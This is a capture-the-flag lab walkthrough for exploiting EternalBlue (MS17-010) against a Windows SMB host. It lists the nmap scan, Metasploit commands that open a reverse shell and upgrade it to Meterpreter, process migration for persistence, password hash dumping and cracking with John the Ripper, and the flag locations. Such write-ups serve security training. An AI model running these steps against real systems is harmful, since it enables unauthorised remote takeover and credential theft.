# Attack Walkthrough — EternalBlue (MS17-010)

## 🔍 Overview

| Detail | Info |
|--------|------|
| **Vulnerability** | MS17-010 — EternalBlue |
| **CVE** | CVE-2017-0144 |
| **Target** | Windows SMB (port 445) |
| **Impact** | Remote code execution as SYSTEM |
| **Metasploit Module** | `exploit/windows/smb/ms17_010_eternalblue` |

---

## 📡 Phase 1 — Recon

### Run a Vulnerability Scan

```bash
nmap -sV -sC --script vuln -oN blue.nmap 10.114.181.71
```

| Flag | Purpose |
|------|---------|
| `-sV` | Detect service versions |
| `-sC` | Run default scripts — common misconfigurations etc. |
| `--script vuln` | Check for known CVEs |
| `-oN blue.nmap` | Save results to `blue.nmap` |

### Read the Results

```bash
less blue.nmap      # Interactive viewer — better than cat for long files
                    # Search with /keyword | quit with q
```

Look for MS17-010 or SMBv1 vulnerability entries in the output.

---

## 🚪 Phase 2 — Gain Access

```bash
# Step 1 — Launch Metasploit
msfconsole

# Step 2 — Find the exploit
search ms17-010

# Step 3 — Load the exploit
use exploit/windows/smb/ms17_010_eternalblue

# Step 4 — Set required parameters and run
show options
set RHOSTS 10.114.181.71
set LHOST <your_attacker_IP>
run
```

> If successful, a DOS shell appears.
> Press `CTRL+Z` to background the session and return to msfconsole.

---

## ⬆️ Phase 3 — Escalate to Meterpreter

```bash
# Step 1 — Convert the shell to Meterpreter
use post/multi/manage/shell_to_meterpreter

# Step 2 — Find and set the session
sessions -l                     # List active sessions
set SESSION <sessionId>
run

# Step 3 — Switch to the new Meterpreter session
sessions <sessionId>

# Step 4 — Verify privilege escalation
whoami                          # Should return: nt authority\system
# Or in Meterpreter:
getuid

# Step 5 — List running processes
ps                              # Find PID of spoolsv.exe (printing service)

# Step 6 — Migrate to a stable process
migrate 1284                    # Use the PID noted from ps output
```

> Migrating to `spoolsv.exe` ensures a more stable and persistent Meterpreter session.

---

## 🔓 Phase 4 — Cracking Credentials

```bash
# Step 1 — Dump password hashes from the machine
hashdump

# Step 2 — Save the target hash to a file
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > jon.hash

# Step 3 — Crack the hash with John the Ripper
john jon.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt

# Step 4 — Display the cracked password
john jon.hash --format=NT --show
# Alternative:
john --show jon.hash
```

---

## 🚩 Phase 5 — Flag Hunting

Navigate the file system from Meterpreter to find the flags.

| Flag | Location | How to Find |
|------|----------|-------------|
| `flag1.txt` | `C:\` | Navigate to root `C:` drive |
| `flag2.txt` | `C:\Windows\System32\config` | `search -f flag2.txt` then `cd Windows/System32/config` |
| `flag3.txt` | `C:\Users\Jon\Documents` | `cd Users` → `ls` → `cd Jon` → `cd Documents` |

```bash
# flag1
cd C:\\
cat flag1.txt

# flag2
search -f flag2.txt
cd Windows/System32/config
cat flag2.txt

# flag3
cd C:\\Users\\Jon\\Documents
cat flag3.txt
```

---

## 🗺️ Full Attack Flow Summary

```
Recon          →  nmap vuln scan  →  identify MS17-010
Gain Access    →  msfconsole      →  ms17_010_eternalblue
Escalate       →  shell_to_meterpreter → migrate to spoolsv.exe
Crack          →  hashdump → john the ripper → cracked password
Flags          →  navigate filesystem → C:\ / System32 / Jon/Documents
```
